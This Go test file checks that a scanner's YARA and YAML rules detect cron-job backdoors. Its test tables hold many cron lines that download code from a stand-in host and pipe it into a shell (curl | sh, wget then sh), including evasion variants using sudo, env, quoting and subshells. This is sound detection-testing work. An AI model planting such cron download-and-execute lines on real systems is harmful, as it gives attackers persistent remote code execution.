//go:build yara

package yara_test

import (
	"fmt"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/signatures"
	csmyara "github.com/pidginhost/csm/internal/yara"
)

func cronRuleScanners(t *testing.T) (*csmyara.Scanner, *signatures.Scanner) {
	t.Helper()
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")
	yaraScanner, err := csmyara.NewScanner(configsDir)
	if err != nil {
		t.Fatalf("loading YARA rules: %v", err)
	}
	yamlScanner := signatures.NewScanner(configsDir)
	if err := yamlScanner.LoadError(); err != nil {
		t.Fatalf("loading YAML rules: %v", err)
	}
	return yaraScanner, yamlScanner
}

func assertCronRules(t *testing.T, yaraScanner *csmyara.Scanner, yamlScanner *signatures.Scanner, content []byte, want bool) {
	t.Helper()
	matches, err := yaraScanner.ScanBytesChecked(content)
	if err != nil {
		t.Fatalf("YARA scan failed: %v", err)
	}
	if got := hasRepositoryYaraRule(matches, "backdoor_cron_downloader"); got != want {
		t.Errorf("YARA matched = %t, want %t", got, want)
	}
	if got := hasSignatureRule(yamlScanner.ScanContent(content, ".cron"), "backdoor_cron_reverse_shell"); got != want {
		t.Errorf("YAML matched = %t, want %t", got, want)
	}
}

func TestCronDownloaderCommandBoundaries(t *testing.T) {
	yaraScanner, yamlScanner := cronRuleScanners(t)

	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"sudo user named sh without command", "curl https://example.test/a | sudo -u sh", false},
		{"unset variable named sh without command", "curl https://example.test/a | env -u sh", false},
		{"long unset option without command", "curl https://example.test/a | env --unset sh", false},
		{"attached unset option", "curl https://payload.example.test/a | env --unset=sh /bin/bash", true},
		{"escaped env assignment without command", "curl https://example.test/a | env NOTE=word\\ sh", false},
		{"escaped env assignment", "curl https://payload.example.test/a | env NOTE=word\\ sh /bin/bash", true},
		{"sudo user option", "curl https://payload.example.test/a | sudo -u root /bin/bash", true},
		{"quoted env assignment", "curl https://payload.example.test/a | env NOTE='word sh' /bin/bash", true},
		{"env assignment without command", "curl https://example.test/a | env NOTE='word sh'", false},
		{"double quoted env assignment without command", "curl https://example.test/a | env NOTE=\"word sh\"", false},
		{"env assignment", "curl https://payload.example.test/a | env PATH=/usr/bin:/bin bash", true},
		{"nested wrappers", "curl https://payload.example.test/a | /usr/bin/sudo -n env PATH=/usr/bin:/bin /bin/sh", true},
		{"sudo option", "curl https://payload.example.test/a | sudo -n /bin/bash", true},
		{"resolved shell", "curl https://payload.example.test/a | $(which bash)", true},
		{"resolved absolute shell", "curl https://payload.example.test/a | $(command -v /bin/sh)", true},
		{"env wrapper", "curl https://payload.example.test/a | env bash", true},
		{"quoted shell", "curl https://payload.example.test/a | \"bash\"", true},
		{"quoted absolute shell", "curl https://payload.example.test/a | '/bin/sh'", true},
		{"subshell", "wget -O /tmp/a https://payload.example.test/a; (bash /tmp/a)", true},
		{"brace group", "wget -O /tmp/a https://payload.example.test/a && { sh /tmp/a; }", true},
		{"shell input redirection", "wget -O /tmp/a https://payload.example.test/a; sh</tmp/a", true},
		{"shell name in script", "curl https://example.test/a; sh.php", false},
		{"shell name in tool", "curl https://example.test/a | sh-check", false},
		{"quoted tool name", "curl https://example.test/a | \"sh\"-check", false},
		{"quoted script name", "curl https://example.test/a; 'sh'.php", false},
		{"resolved tool name", "curl https://example.test/a | $(which sh)-check", false},
		{"shell name in path", "curl https://example.test/a; /bin/sh/assets", false},
		{"assignment", "curl https://example.test/a; exec=value", false},
		{"URL parameter", "curl \"https://example.test/task;eval=1\"", false},
		{"separate line", "curl https://example.test/a |\nbash documentation", false},
		{"separate line after sudo", "curl https://example.test/a | sudo\nsh documentation", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			assertCronRules(t, yaraScanner, yamlScanner, []byte("*/5 * * * * "+tc.command), tc.want)
		})
	}
}

// The rule used to require an every-N-minutes schedule, so a downloader
// planted to run every minute, hourly, daily or at boot went unreported.
func TestCronDownloaderSchedules(t *testing.T) {
	yaraScanner, yamlScanner := cronRuleScanners(t)
	const command = " curl -fsSL https://payload.example.test/a | sh"
	tests := []struct {
		schedule string
		want     bool
	}{
		{"*/5 * * * *", true},
		{"* * * * *", true},
		{"0 * * * *", true},
		{"30 3 * * *", true},
		{"0,15,30,45 * * * *", true},
		{"0 9-17 * * 1-5", true},
		{"*/10 */2 1-15/2 * *", true},
		{"0 0 1 1 *", true},
		{"0 0 * 1-12/2 1-5/2", true},
		{"6~15 * * * *", true},
		{"~15 * * * *", true},
		{"6~ * * * *", true},
		{"~ * * * *", true},
		{"0 ~ 1~15 1~6 1~5", true},
		{"-0 0 * * *", true},
		{"*\t*\t*\t*\t*", true},
		{"17 * * * * root", true},
		{"@reboot", true},
		{"@hourly", true},
		{"@daily", true},
		{"@midnight", true},
		{"@weekly", true},
		{"@monthly", true},
		{"@yearly", true},
		{"@annually", true},
		{"@REBOOT", true},
		{"* * * *", false},
		{"* * *\n* *", false},
		{"the cat sat on the", false},
		// Month and weekday names are not matched: their alternations made
		// each download word on a crafted line several times costlier.
		{"0 0 * jan-dec mon,wed,fri", false},
		{"0 0 * * sun", false},
		{"0 0 * june mon", false},
		{"0 0 * * monday", false},
		{"0 0 * * mon-fried", false},
		{"0 0 * * *suffix", false},
		{"0 0 * * *curl", false},
		{"@rebooted", false},
		{"@rebootcurl", false},
		{"user@reboot", false},
		{"prefix0 0 * * *", false},
		{"0 0 * * *\n", false},
		{"@reboot\n", false},
		{"0\r0 * * *", false},
		{"0\v0 * * *", false},
		{"0\f0 * * *", false},
		{"0 0 * * *\r", false},
		{"@reboot\f", false},
		{"jan 0 * * *", false},
		{"0 mon * * *", false},
		{"0 0 jan * *", false},
	}
	for _, tc := range tests {
		t.Run(tc.schedule, func(t *testing.T) {
			assertCronRules(t, yaraScanner, yamlScanner, []byte(tc.schedule+command+"\n"), tc.want)
		})
	}
}

func TestCronDownloaderFieldBounds(t *testing.T) {
	yaraScanner, yamlScanner := cronRuleScanners(t)
	for field := range 5 {
		for _, size := range []int{64, 65} {
			for _, shape := range []string{"number", "list"} {
				fields := []string{"0", "0", "1", "1", "1"}
				fields[field] = strings.Repeat("0", size-1) + "1"
				if shape == "list" {
					fields[field] = strings.Repeat("1,", (size-1)/2) + "1"
					if size%2 == 0 {
						fields[field] = strings.Repeat("1,", size/2-1) + "01"
					}
				}
				schedule := strings.Join(fields, " ")
				t.Run(fmt.Sprintf("field_%d/size_%d/%s", field, size, shape), func(t *testing.T) {
					assertCronRules(t, yaraScanner, yamlScanner, []byte(schedule+" curl https://payload.example.test/a | sh\n"), size == 64)
				})
			}
		}
	}
}

func TestCronDownloaderScheduleGap(t *testing.T) {
	yaraScanner, yamlScanner := cronRuleScanners(t)
	for _, size := range []int{128, 129} {
		gap := strings.Repeat(" ", size)
		t.Run(fmt.Sprintf("size_%d", size), func(t *testing.T) {
			assertCronRules(t, yaraScanner, yamlScanner, []byte("* * * * *"+gap+"curl https://payload.example.test/a | sh\n"), size == 128)
		})
	}
}
